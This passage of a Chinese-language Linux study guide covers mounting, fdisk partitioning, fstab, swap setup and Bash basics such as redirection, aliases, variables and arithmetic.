<td>具有/不具有SUID权限,设定文件系统是否具有SUID和SGID的权限,默认是具有</td>
</tr>
<tr>
<td>user/nouser</td>
<td>允许/不允许普通用户挂载,设定文件系统是否允许普通用户挂载,默认是不允许,只有root可以挂载分区</td>
</tr>
<tr>
<td>usrquota</td>
<td>写入代表文件系统支持用户磁盘配额,默认不支持</td>
</tr>
<tr>
<td>grpquota</td>
<td>写入代表文件系统支持组磁盘配额,默认不支持</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -o remount,noexec &#x2F;home</span><br></pre></td></tr></table></figure>
<h5 id="挂载光盘和U盘"><a href="#挂载光盘和U盘" class="headerlink" title="挂载光盘和U盘"></a>挂载光盘和U盘</h5><h6 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h6><ol>
<li>mkdir /mnt/cdrom    #建立挂载点</li>
<li>mount -t iso9660 /dev/cdrom /mnt/cdrom     #挂载光盘</li>
<li>mount /dev/sr0 /mnt/cdrom   #2,3均可以挂载光盘</li>
<li>去挂载点访问光盘</li>
<li>umount 设备文件名或挂载点     #卸载光盘,注意不能在光盘中执行此命令</li>
</ol>
<p>光盘设备名:</p>
<ul>
<li>/dev/cdrom  </li>
<li>/dev/sr0</li>
</ul>
<h6 id="挂载U盘"><a href="#挂载U盘" class="headerlink" title="挂载U盘"></a>挂载U盘</h6><p>U盘设备文件名是自动分配的</p>
<ol>
<li>fdisk -l      #查看U盘设备文件名</li>
<li>mount -t vfat /dev/sdb1 /mnt/usb   #挂载U盘</li>
<li>umount 设备文件名或挂载点     </li>
</ol>
<p>注意:Linux把fat16识别为fat,把fat32识别为vfat;Linux默认是不支持NTFS文件系统的</p>
<h5 id="支持NTFS文件系统"><a href="#支持NTFS文件系统" class="headerlink" title="支持NTFS文件系统"></a>支持NTFS文件系统</h5><p>可通过内核编译(复杂且使用较少)或使用NTFS插件使Linux支持NTFS文件系统,详细过程点击<a href="https://www.codenong.com/cs105317766/">链接</a>查看</p>
<h3 id="fdisk分区"><a href="#fdisk分区" class="headerlink" title="fdisk分区"></a>fdisk分区</h3><h4 id="fdisk命令分区过程"><a href="#fdisk命令分区过程" class="headerlink" title="fdisk命令分区过程"></a>fdisk命令分区过程</h4><ol>
<li>添加新硬盘</li>
<li>fdisk -l    #查看新硬盘</li>
<li>fdisk /dev/sdb     #使用fdisk命令分区(Ctrl+退格删除)</li>
<li>partprobe或重启         #重新读取分区表信息(如果分区表被占用)</li>
<li>mkfs -t ext4 /dev/sdb1     #格式化分区</li>
<li>mkdir /disk1    #建立挂载点</li>
<li>mount /dev/sdb1 /disk1/    #挂载</li>
</ol>
<p><img src="https://i.loli.net/2021/02/02/dipW8GsbrjTZNJ5.png" alt=""></p>
<p>Linux通过id识别Linux分区到底是什么,Linux标准分区id是83,swap分区id是82;详细过程点击<a href="https://blog.csdn.net/keith6785753/article/details/107324335/">链接</a>查看</p>
<h4 id="分区自动挂载与fstab文件修复"><a href="#分区自动挂载与fstab文件修复" class="headerlink" title="分区自动挂载与fstab文件修复"></a>分区自动挂载与fstab文件修复</h4><h5 id="etc-fstab文件"><a href="#etc-fstab文件" class="headerlink" title="/etc/fstab文件"></a>/etc/fstab文件</h5><ul>
<li>第一字段: 分区设备文件名或UUID(硬盘通用唯一识别码)</li>
<li>第二字段: 挂载点</li>
<li>第三字段: 文件系统名称</li>
<li>第四字段: 挂载参数</li>
<li>第五字段: 指定分区是否被dump备份,0代表不备份,1代表每天备份,2代表不定期备份</li>
<li>第六字段: 指定分区是否被fsck检测,0代表不检测,其他数字代表检测的优先级,那么当然1的优先级比2高</li>
</ul>
<h5 id="分区自动挂载"><a href="#分区自动挂载" class="headerlink" title="分区自动挂载"></a>分区自动挂载</h5><p>方法1:手工修改/etc/fstab(写错会系统崩溃)</p>
<ol>
<li>vi /etc/fstab</li>
<li>/dev/sdb1      /disk1       ext4       defaults     1   2    #安装格式填入挂载内容</li>
</ol>
<p>方法2:使用mount命令</p>
<ol>
<li>mount -a           #依据配置文件/etc/fstab的内容,自动挂载</li>
</ol>
<h5 id="etc-fstab文件修复"><a href="#etc-fstab文件修复" class="headerlink" title="/etc/fstab文件修复"></a>/etc/fstab文件修复</h5><p>系统崩溃后,修改/etc/fstab文件时无法写入,使用下面命令</p>
<ol>
<li>mount -o remount,rw /     #这种修复方式不是万能的</li>
</ol>
<h3 id="分配swap分区"><a href="#分配swap分区" class="headerlink" title="分配swap分区"></a>分配swap分区</h3><h4 id="free命令"><a href="#free命令" class="headerlink" title="free命令"></a>free命令</h4><p>[root@localhost ~]# free -m         #查看内存与swap分区使用状况,m不是按照MB查看</p>
<ul>
<li>cached(缓存): 是指把读取出来的数据保存在内存当中,当再次读取时,不用读取硬盘而直接从内存当中读取,加速了数据的读取过程</li>
<li>buffer(缓冲): 是指在写入数据时,先把分散的写入操作保存到内存当中,当达到一定程度再集中写入硬盘,减少了磁盘碎片和硬盘的反复寻道,加速了数据的写入过程</li>
</ul>
<h4 id="新建swap分区"><a href="#新建swap分区" class="headerlink" title="新建swap分区"></a>新建swap分区</h4><p>[root@localhost ~]# fdisk /dev/sdb   #注意要把swap分区id改为82</p>
<h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><p>[root@localhost ~]# mkswap /dev/sdb6</p>
<h4 id="加入swap分区"><a href="#加入swap分区" class="headerlink" title="加入swap分区"></a>加入swap分区</h4><p>[root@localhost ~]# swapon /dev/sdb6        #加入swap分区</p>
<p>[root@localhost ~]# swapoff /dev/sdb6       #取消swap分区</p>
<h4 id="swap分区开机自动挂载"><a href="#swap分区开机自动挂载" class="headerlink" title="swap分区开机自动挂载"></a>swap分区开机自动挂载</h4><p>[root@localhost ~]# vi /etc/fstab<br>/dev/sdb6    swap       swap     defaults     0    0</p>
<h2 id="shell基础"><a href="#shell基础" class="headerlink" title="shell基础"></a>shell基础</h2><h3 id="Shell概述"><a href="#Shell概述" class="headerlink" title="Shell概述"></a>Shell概述</h3><h4 id="Shell简介"><a href="#Shell简介" class="headerlink" title="Shell简介"></a>Shell简介</h4><ul>
<li>Shell是一个命令行解释器,它为用户提供了一个向Linux内核发送请求以便运行程序的界面系统级程序,用户可以用Shell来启动、挂起、停止甚至是编写一些程序</li>
<li>Shell还是一个功能相当强大的编程语言,易编写,易调试,灵活性较强.Shell是解释执行的脚本语言,在Shell中可以直接调用Linux系统命令</li>
</ul>
<h4 id="Shell的分类"><a href="#Shell的分类" class="headerlink" title="Shell的分类"></a>Shell的分类</h4><ul>
<li>Bourne Shell: 从1979起Unix就开始使用Bourne Shell,Bourne Shell的主文件名为sh</li>
<li>C Shell: C Shell主要在BSD版的Unix系统中使用,其语法和C语言相类似而得名</li>
<li>Shell的两种主要语法类型有Bourne和C,这两种语法彼此不兼容.Bourne家族主要包括sh、ksh、Bash、psh、zsh; C家族主要包括: csh、tcsh</li>
<li>Bash: Bash与sh兼容,现在使用的Linux就是使用Bash作为用户的基本Shell</li>
</ul>
<h4 id="Linux支持的Shell"><a href="#Linux支持的Shell" class="headerlink" title="Linux支持的Shell"></a>Linux支持的Shell</h4><p>打开/etc/shells文件查看Linux支持的Shell</p>
<h3 id="Shell脚本的执行方式"><a href="#Shell脚本的执行方式" class="headerlink" title="Shell脚本的执行方式"></a>Shell脚本的执行方式</h3><h4 id="echo输出命令"><a href="#echo输出命令" class="headerlink" title="echo输出命令"></a>echo输出命令</h4><p>[root@localhost ~]# echo [选项] [输出内容]<br>选项:<br>    -e      支持反斜线控制的字符转换</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>控制字符</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>\\\\</td>
<td>输出\本身</td>
</tr>
<tr>
<td>\\a</td>
<td>输出警告音</td>
</tr>
<tr>
<td>\\b</td>
<td>退格键,也就是向左删除键</td>
</tr>
<tr>
<td>\\c</td>
<td>取消输出行末的换行符,和“-n”选项一致</td>
</tr>
<tr>
<td>\\e</td>
<td>ESCAPE键</td>
</tr>
<tr>
<td>\\f</td>
<td>换页符</td>
</tr>
<tr>
<td>\\n</td>
<td>换行符</td>
</tr>
<tr>
<td>\\r</td>
<td>回车键</td>
</tr>
<tr>
<td>\\t</td>
<td>制表符,也就是Tab键</td>
</tr>
<tr>
<td>\\v</td>
<td>垂直制表符</td>
</tr>
<tr>
<td>\\0nnn</td>
<td>按照八进制ASCII码表输出字符,其中0为数字零,nnn是三位八进制数</td>
</tr>
<tr>
<td>\\xhh</td>
<td>按照十六进制ASCII码表输出字符,其中hh是两位十六进制数</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -e &quot;\e[1;31mabcd\e[0m&quot;    #输出颜色</span><br><span class="line">#30m&#x3D;黑色，31m&#x3D;红色，32m&#x3D;绿色，33m&#x3D;黄色</span><br><span class="line">#34m&#x3D;蓝色，35m&#x3D;洋红，36m&#x3D;青色，37m&#x3D;白色</span><br></pre></td></tr></table></figure>
<h4 id="脚本执行"><a href="#脚本执行" class="headerlink" title="脚本执行"></a>脚本执行</h4><ol>
<li>赋予执行权限,直接运行<ul>
<li>chmod 755 hello.sh </li>
<li>./hello.sh</li>
</ul>
</li>
<li>通过Bash调用执行脚本<ul>
<li>bash hello.sh </li>
</ul>
</li>
</ol>
<p>在Linux中回车符识别为$,windows回车符识别为^M$,所以Linux无法识别在windows编写的脚本,将在windows编写的脚本转换为Linux可识别的脚本,可使用dos2unix命令</p>
<p>格式: dos2unix 文件名</p>
<h3 id="Bash的基本功能"><a href="#Bash的基本功能" class="headerlink" title="Bash的基本功能"></a>Bash的基本功能</h3><h4 id="历史命令与命令补全"><a href="#历史命令与命令补全" class="headerlink" title="历史命令与命令补全"></a>历史命令与命令补全</h4><h5 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h5><p>[root@localhost~]#  history [选项] [历史命令保存文件]<br>选项:<br>    -c      清空历史命令<br>    -w    把缓存中的历史命令写入历史命令保存文件~/.bash_history</p>
<p>历史命令默认会保存1000条,可以在环境变量配置文件/etc/profile中进行修改,超过1000条会删除前面的,保留后面的.</p>
<ul>
<li>使用上、下箭头调用以前的历史命令</li>
<li>使用”!n”重新执行第n条历史命令</li>
<li>使用”!!”重新执行上一条命令</li>
<li>使用”!字串”重新执行最后一条以该字串开头的命令</li>
</ul>
<h5 id="命令补全"><a href="#命令补全" class="headerlink" title="命令补全"></a>命令补全</h5><p>在Bash中,命令与文件补全是非常方便与常用的功能,我们只要在输入命令或文件<br>时,按”Tab”键就会自动进行补全,如果有很多条可能不会显示,再按一下即可</p>
<h4 id="命令别名与常用快捷键"><a href="#命令别名与常用快捷键" class="headerlink" title="命令别名与常用快捷键"></a>命令别名与常用快捷键</h4><h5 id="命令别名"><a href="#命令别名" class="headerlink" title="命令别名"></a>命令别名</h5><p>[root@localhost ~]# alias 别名=’原命令’</p>
<h1 id="设定命令别名"><a href="#设定命令别名" class="headerlink" title="设定命令别名"></a>设定命令别名</h1><p>[root@localhost ~]# alias</p>
<h1 id="查询命令别名"><a href="#查询命令别名" class="headerlink" title="查询命令别名"></a>查询命令别名</h1><p>使用命令行设定别名只会临时生效;使用别名时要注意命令执行顺序</p>
<h6 id="命令执行顺序"><a href="#命令执行顺序" class="headerlink" title="命令执行顺序"></a>命令执行顺序</h6><ol>
<li>第一顺位执行用绝对路径或相对路径执行的命令</li>
<li>第二顺位执行别名</li>
<li>第三顺位执行Bash的内部命令</li>
<li>第四顺位执行按照$PATH环境变量定义的目录查找顺序找到的第一个命令</li>
</ol>
<h6 id="让别名永久生效"><a href="#让别名永久生效" class="headerlink" title="让别名永久生效"></a>让别名永久生效</h6><p>[root@localhost ~]# vi /用户名/.bashrc    #修改其中相关内容</p>
<h5 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h5><div class="table-container">
<table>
<thead>
<tr>
<th>快捷键</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctr1+a</td>
<td>把光标移动到命令行开头</td>
</tr>
<tr>
<td>Ctrl+e</td>
<td>把光标移动到命令行结尾</td>
</tr>
<tr>
<td>Ctrl+c</td>
<td>强制终止当前的命令</td>
</tr>
<tr>
<td>Ctrl+l</td>
<td>清屏,相当于clear命令</td>
</tr>
<tr>
<td>Ctrl+u</td>
<td>删除或剪切光标之前的命令</td>
</tr>
<tr>
<td>Ctrl+k</td>
<td>删除或剪切光标之后的内容</td>
</tr>
<tr>
<td>Ctrl+y</td>
<td>粘贴Ctrl+u或Ctrl+k剪切的内容</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td>在历史命令中搜索,按下Ctrl+r之后,就会出现搜索界面,只要输入搜索内容,就会从历史命令中搜索</td>
</tr>
<tr>
<td>Ctrl+d</td>
<td>退出当前终端</td>
</tr>
<tr>
<td>Ctrl+z</td>
<td>暂停,并放入后台.这个快捷键与工作管理有关</td>
</tr>
<tr>
<td>Ctrl+s</td>
<td>暂停屏幕输出</td>
</tr>
<tr>
<td>Ctrl+q</td>
<td>恢复屏幕输出</td>
</tr>
</tbody>
</table>
</div>
<h4 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h4><h5 id="标准输入输出"><a href="#标准输入输出" class="headerlink" title="标准输入输出"></a>标准输入输出</h5><div class="table-container">
<table>
<thead>
<tr>
<th>设备</th>
<th>设备文件名</th>
<th>文件描述符</th>
<th>类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>键盘</td>
<td>/dev/stdin</td>
<td>0</td>
<td>标准输入</td>
</tr>
<tr>
<td>显示器</td>
<td>/dev/stdout</td>
<td>1</td>
<td>标准输出</td>
</tr>
<tr>
<td>显示器</td>
<td>/dev/stderr</td>
<td>2</td>
<td>标准错误输出</td>
</tr>
</tbody>
</table>
</div>
<h5 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h5><table>
    <tr>
        <th>类型</th>
        <th>符号</th>
        <th>作用</th>
    </tr>
    <tr>
        <td rowspan="2">标准输出重定向</td>
        <td>命令 > 文件</td>
        <td>以覆盖的方式,把命令的正确输出输出到指定的文件或设备当中</td>
    </tr>
    <tr>
        <td>命令 >> 文件</td>
        <td>以追加的方式,把命令的正确输出输出到指定的文件或设备当中</td>
    </tr>
    <tr>
        <td rowspan="2">标准错误输出重定向</td>
        <td>错误命令 2> 文件</td>
        <td>以覆盖的方式,把命令的错误输出输出到指定的文件或设备当中</td>
    </tr>
    <tr>
        <td>错误命令 2>> 文件</td>
        <td>以追加的方式,把命令的错误输出输出到指定的文件或设备当中</td>
    </tr>
    <tr>
        <td rowspan="5">正确输出和错误输出同时保存</td>
        <td>命令 > 文件 2>&1</td>
        <td>以覆盖的方式,把正确输出和错误输出都保存到同一个文件当中</td>
    </tr>
    <tr>
        <td>命令 >> 文件 2>&1</td>
        <td>以追加的方式,把正确输出和错误输出都保存到同一个文件当中</td>
    </tr>
    <tr>
        <td>命令 &> 文件</td>
        <td>以覆盖的方式,把正确输出和错误输出都保存到同一个文件当中</td>
    </tr>
    <tr>
        <td>命令 &>> 文件</td>
        <td>以追加的方式,把正确输出和错误输出都保存到同一个文件当中</td>
    </tr>
    <tr>
        <td>命令 >> 文件1 2>>文件2</td>
        <td>把正确的输出追加到文件1中,把错误的输出追加到文件2中</td>
    </tr>
</table>



<ul>
<li>注意2与大于号(&gt;)之间不能有空格,命令与大于号之间,文件与大于号之间最好也有空格</li>
<li>2&gt;&amp;1表示把错误输出保存到正确输出中</li>
<li>ls &amp;&gt; /dev/null     #把ls结果丢进垃圾箱</li>
</ul>
<h5 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h5><p>[root@localhost~] # wc [选项] [文件名]<br>选项:<br>    -c  统计字节数<br>    -w  统计单词数<br>    -l  统计行数</p>
<p>Ctrl+d结束输入(wc会统计回车符)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc &lt; 文件名   #统计该文件行数等信息</span><br><span class="line">wc &lt;&lt; test   #当第一次遇到test时停止,统计test之前的内容</span><br></pre></td></tr></table></figure>
<h4 id="多命令顺序执行与管道符"><a href="#多命令顺序执行与管道符" class="headerlink" title="多命令顺序执行与管道符"></a>多命令顺序执行与管道符</h4><h5 id="多命令顺序执行"><a href="#多命令顺序执行" class="headerlink" title="多命令顺序执行"></a>多命令顺序执行</h5><div class="table-container">
<table>
<thead>
<tr>
<th>多命令执行符</th>
<th>格式</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>;</td>
<td>命令1 ; 命令2</td>
<td>多个命令顺序执行,命令之间没有任何逻辑联系</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>命令1 &amp;&amp; 命令2</td>
<td>逻辑与<br>当命令1正确执行,则命令2才会执行 <br>当命令1执行不正确,则命令2不会执行</td>
</tr>
<tr>
<td>\</td>
<td>\</td>
<td></td>
<td>命令1 \</td>
<td>\</td>
<td>命令2</td>
<td>逻辑或<br/>当命令1执行不正确,则命令2才会执行<br>当命令1正确执行,则命令2不会执行</td>
</tr>
</tbody>
</table>
</div>
<h5 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h5><p>用于磁盘复制</p>
<p>[root@localhost ~]# dd if=输入文件 of=输出文件 bs=字节数 count=个数<br>选项:<br>    if=输入文件       指定源文件或源设备<br>    of=输出文件      指定目标文件或目标设备<br>    bs=字节数          指定一次输入/输出多少字节,即把这些字节看做一个数据块<br>    count=个数        指定输入/输出多少个数据块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">date ; dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;root&#x2F;test bs&#x3D;1k count&#x3D;102400 ; date     #记录&#x2F;dev&#x2F;zero向&#x2F;root&#x2F;test复制100MB</span><br><span class="line">命令 &amp;&amp; echo yes || echo no   #如果命令正确执行则输出yes,否则输出no</span><br></pre></td></tr></table></figure>
<h5 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h5><p>[root@localhost ~]# 命令1|命令2</p>
<h1 id="命令1的正确输出作为命令2的操作对象"><a href="#命令1的正确输出作为命令2的操作对象" class="headerlink" title="命令1的正确输出作为命令2的操作对象"></a>命令1的正确输出作为命令2的操作对象</h1><h4 id="通配符与其他特殊符号"><a href="#通配符与其他特殊符号" class="headerlink" title="通配符与其他特殊符号"></a>通配符与其他特殊符号</h4><h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><div class="table-container">
<table>
<thead>
<tr>
<th>通配符</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>?</td>
<td>匹配一个任意字符</td>
</tr>
<tr>
<td>*</td>
<td>匹配0个或任意多个任意字符,也就是可以匹配任何内容</td>
</tr>
<tr>
<td>[]</td>
<td>匹配中括号中任意一个字符.例如:[abc]代表一定匹配一个字符,或者是a,或者是b,或者是c</td>
</tr>
<tr>
<td>[-]</td>
<td>匹配中括号中任意一个字符,代表一个范围.例如: [a-z]代表匹配一个小写字母</td>
</tr>
<tr>
<td><sup><a href="#fn_" id="reffn_"></a></sup></td>
<td>逻辑非,表示匹配不是中括号内的一个字符.例如: [\^0-9]代表匹配一个不是数字的字符</td>
</tr>
</tbody>
</table>
</div>
<h5 id="其他特殊符号"><a href="#其他特殊符号" class="headerlink" title="其他特殊符号"></a>其他特殊符号</h5><div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>‘’</td>
<td>单引号.在单引号中所有的特殊符号,如”$“和”`”(反引号)都没有特殊含义</td>
</tr>
<tr>
<td>“”</td>
<td>双引号.在双引号中特殊符号都没有特殊含义,但是”$“、”`”和”\\”是例外,拥有”调用变量的值”、”引用命令”和”转义符”的特殊含义</td>
</tr>
<tr>
<td>`</td>
<td>反引号.反引号括起来的内容是系统命令,在bash中会先执行它.和$()作用一样,不过推荐使用​$(),因为反引号非常容易看错</td>
</tr>
<tr>
<td>$()</td>
<td>和反引号作用一样,用来引用系统命令</td>
</tr>
<tr>
<td>#</td>
<td>在Shell脚本中,#开头的行代表注释</td>
</tr>
<tr>
<td>$</td>
<td>用于调用变量的值,如需要调用变量name的值时,需要用$name的方式得到变量的值</td>
</tr>
<tr>
<td>\\</td>
<td>转义符.跟在\\之后的特殊符号将失去特殊含义,变为普通字符.如$将输出”$“符号,而不当做是变量引用</td>
</tr>
</tbody>
</table>
</div>
<h3 id="Bash的变量"><a href="#Bash的变量" class="headerlink" title="Bash的变量"></a>Bash的变量</h3><p>shell中默认变量类型为字符型</p>
<h4 id="变量分类"><a href="#变量分类" class="headerlink" title="变量分类"></a>变量分类</h4><ul>
<li>用户自定义变量(本地变量)</li>
<li>环境变量: 这种变量中主要保存的是和系统操作环境相关的数据</li>
<li>位置参数变量: 这种变量主要是用来向脚本当中传递参数或数据的,变量名不能自定义,变量作用是固定的</li>
<li>预定义变量: 是Bash中已经定义好的变量,变量名不能自定义,变量作用也是固定的</li>
</ul>
<h4 id="用户自定义变量"><a href="#用户自定义变量" class="headerlink" title="用户自定义变量"></a>用户自定义变量</h4><p>或者叫本地变量</p>
<h5 id="变量设置规则"><a href="#变量设置规则" class="headerlink" title="变量设置规则"></a>变量设置规则</h5><ul>
<li>变量名称可以由字母、数字和下划线组成,但是不能以数字开头</li>
<li>在Bash中,变量的默认类型都是字符串型,如果要进行数值运算,则必需指定变量类型为数值型</li>
<li>变量用等号连接值,等号左右两侧不能有空格</li>
<li>变量的值如果有空格,需要使用单引号或双引号括起来</li>
<li>在变量的值中,可以使用”\\”转义符</li>
<li>如果需要增加变量的值,那么可以进行变量值的叠加.不过变量需要用双引号包含”$变量名”或用${变量名}包含</li>
<li>如果是把命令的结果作为变量值赋予变量,则需要使用反引号或$()包含命令</li>
<li>环境变量名建议大写,便于区分</li>
</ul>
<h5 id="变量叠加"><a href="#变量叠加" class="headerlink" title="变量叠加"></a>变量叠加</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc&#x3D;123           #abc值为123</span><br><span class="line">abc&#x3D;&quot;$abc&quot;456     #给abc的值追加456</span><br><span class="line">abc&#x3D;$&#123;abc&#125;789     #给abc的值追加789</span><br></pre></td></tr></table></figure>
<h5 id="变量调用"><a href="#变量调用" class="headerlink" title="变量调用"></a>变量调用</h5><p>echo $变量名</p>
<h5 id="变量查看"><a href="#变量查看" class="headerlink" title="变量查看"></a>变量查看</h5><p>set</p>
<blockquote>
<p>查看系统所有变量</p>
</blockquote>
<h5 id="变量删除"><a href="#变量删除" class="headerlink" title="变量删除"></a>变量删除</h5><p>unset 变量名</p>
<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><h5 id="环境变量特点"><a href="#环境变量特点" class="headerlink" title="环境变量特点"></a>环境变量特点</h5><ul>
<li>用户自定义变量只在当前的Shell中生效,而环境变量会在当前Shell和这个Shell的所有子Shell当中生效.如果把环境变量写入相应的配置文件,那么这个环境变量就会在所有的Shell中生效</li>
</ul>
<h5 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h5><p>export 变量名[=变量值]        #声明变量(export表示把变量声明为全局变量)</p>
<h5 id="查询环境变量"><a href="#查询环境变量" class="headerlink" title="查询环境变量"></a>查询环境变量</h5><p>env</p>
<blockquote>
<p>专门用于查询环境变量(删除变量依旧是unset+变量名)</p>
</blockquote>
<h5 id="系统常见环境变量"><a href="#系统常见环境变量" class="headerlink" title="系统常见环境变量"></a>系统常见环境变量</h5><h6 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h6><blockquote>
<p>系统查找命令的路径</p>
</blockquote>
<p>如果想令自己的脚本在任何路径都能直接运行,可以将其加入PATH</p>
<p>方法一:</p>
<blockquote>
<p>直接将脚本拷贝到PATH所指向的路径</p>
</blockquote>
<p>方法二:</p>
<blockquote>
<p>通过变量叠加,为PATH增加新的路径(临时生效,必须写入指定文件)</p>
<p>例如:PATH=”$PATH”:/root   #将root目录加入环境变量</p>
</blockquote>
<h6 id="PS1"><a href="#PS1" class="headerlink" title="PS1"></a>PS1</h6><blockquote>
<p>定义系统提示符的变量</p>
<p>严格来说PS1不是环境变量(env查询不到,set可以查询到),PS1是系统预留的专门用来定义系统操作环境的变量</p>
</blockquote>
<p>\d: 显示日期,格式为“星期 月 日”<br>\h: 显示简写主机名.如默认主机名“localhost”<br>\t: 显示24小时制时间,格式为“HH:MM:SS”<br>\T: 显示12小时制时间,格式为“HH:MM:SS”<br>\A: 显示24小时制时间,格式为“HH:MM”<br>\u: 显示当前用户名<br>\w: 显示当前所在目录的完整名称<br>\W: 显示当前所在目录的最后一个目录<br>\#: 执行的第几个命令<br>\\$: 提示符.如果是root用户会显示提示符为“#”,如果是普通用户会显示提示符为“$”</p>
<h4 id="位置参数变量"><a href="#位置参数变量" class="headerlink" title="位置参数变量"></a>位置参数变量</h4><div class="table-container">
<table>
<thead>
<tr>
<th>位置参数变量</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>$n</td>
<td>n为数字,$0代表命令本身,$1-$9代表第一到第九个参数,十以上的参数需要用大括号包含,如${10}</td>
</tr>
<tr>
<td>$*</td>
<td>这个变量代表命令行中所有的参数,$*把所有的参数看成一个整体</td>
</tr>
<tr>
<td>$@</td>
<td>这个变量也代表命令行中所有的参数,$@把每个参数区分对待</td>
</tr>
<tr>
<td>$#</td>
<td>这个变量代表命令行中所有参数的个数</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for x in &quot;$*&quot;</span><br><span class="line">	do</span><br><span class="line">		echo $x</span><br><span class="line">	done</span><br><span class="line">for y in &quot;$@&quot;</span><br><span class="line">	do</span><br><span class="line">		echo $y</span><br><span class="line">	done</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/21/VM2n9QGFRwhLBdJ.png" alt=""></p>
<h4 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h4><div class="table-container">
<table>
<thead>
<tr>
<th>预定义变量</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>$?</td>
<td>最后一次执行的命令的返回状态.如果这个变量的值为0,证明<br/>上一个命令正确执行;如果这个变量的值为非0(具体是哪个<br/>数,由命令自己来决定),则证明上一个命令执行不正确</td>
</tr>
<tr>
<td>$$</td>
<td>当前进程的进程号(PID)</td>
</tr>
<tr>
<td>$!</td>
<td>后台运行的最后一个进程的进程号(PID)</td>
</tr>
</tbody>
</table>
</div>
<h5 id="接收键盘输入"><a href="#接收键盘输入" class="headerlink" title="接收键盘输入"></a>接收键盘输入</h5><p>[root@localhost ~]# read [选项] [变量名]<br>选项:<br>    -p “提示信息”      在等待read输入时,输出提示信息<br>    -t 秒数                  read命令会一直等待用户输入,使用此选项可以指定等待时间<br>    -n 字符数             read命令只接受指定的字符数,就会执行<br>    -s                           隐藏输入的数据,适用于机密信息的输入</p>
<h3 id="Bash的运算符"><a href="#Bash的运算符" class="headerlink" title="Bash的运算符"></a>Bash的运算符</h3><h4 id="数值运算与运算符"><a href="#数值运算与运算符" class="headerlink" title="数值运算与运算符"></a>数值运算与运算符</h4><p><img src="https://i.loli.net/2021/02/22/mbBqaXHsEU9RGSe.png" alt=""></p>
<p>变量直接相加无法达到预计的效果.</p>
<h5 id="declare声明变量类型"><a href="#declare声明变量类型" class="headerlink" title="declare声明变量类型"></a>declare声明变量类型</h5><p>[root@localhost ~]# declare [+/-] [选项] 变量名<br>选项:<br>    -      给变量设定类型属性<br>    +      取消变量的类型属性<br>    -i     将变量声明为整数型(integer)<br>    -x    将变量声明为环境变量<br>    -p    显示指定变量的被声明的类型</p>
<p>使用export声明环境变量其实就是赋予变量declare -x属性</p>
<h5 id="数值运算"><a href="#数值运算" class="headerlink" title="数值运算"></a>数值运算</h5><h6 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h6><p>使用declare将变量声明为整数型</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x=11</span><br><span class="line">y=22</span><br><span class="line">declare -i z=$x+$y</span><br><span class="line">echo $z</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/22/6TuSNE4ylFZiJ7V.png" alt=""></p>
<h6 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h6><p>使用expr或let数值运算工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x=11</span><br><span class="line">y=22</span><br><span class="line">z=$(expr $x + $y)    注意“+”号左右两侧必须有空格</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/22/avOuV1fIxPZcUrn.png" alt=""></p>
<h6 id="方法3-推荐"><a href="#方法3-推荐" class="headerlink" title="方法3(推荐)"></a>方法3(推荐)</h6><p>“$((运算式))”或”$[运算式]”</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x=11</span><br><span class="line">y=22</span><br><span class="line">m=$(($x+$y))</span><br><span class="line">n=$[$y-$x]</span><br><span class="line">echo $m</span><br><span class="line">echo $n</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/22/5x7IA1mcwFVn6pj.png" alt=""></p>
<h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><p><img src="https://i.loli.net/2021/02/22/RsryJHD18EGS9jf.png" alt=""></p>
